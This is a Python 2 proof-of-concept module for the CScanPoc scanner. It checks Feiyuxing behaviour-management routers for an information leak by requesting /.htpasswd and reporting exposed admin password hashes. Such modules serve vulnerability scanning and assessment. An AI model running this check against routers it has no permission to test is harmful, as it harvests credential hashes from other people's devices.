# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse
import time
import re


class Vuln(ABVuln):
    vuln_id = 'ADSLR_0001'  # 平台漏洞编号，留空
    name = '飞鱼星上网行为管理路由器 信息泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-08-01'  # 漏洞公布时间
    desc = '''
        飞鱼星上网行为管理路由器。
        权限管理控制不严谨，直接访问 /.htpasswd 可获取加密后的用户密码。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '飞鱼星上网行为管理路由器'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '29c16e8a-81b2-401f-a079-4cd4932ca21a'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # ref:http://www.wooyun.org/bugs/wooyun-2010-070579
            hh = hackhttp.hackhttp()
            arg = self.target
            poc1 = arg + '/.htpasswd'
            code, head, res, errcode, _ = hh.http(poc1)

            if code == 200 and 'admin:$' in res:
                #security_hole("Router vulnerable!:"+poc1)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
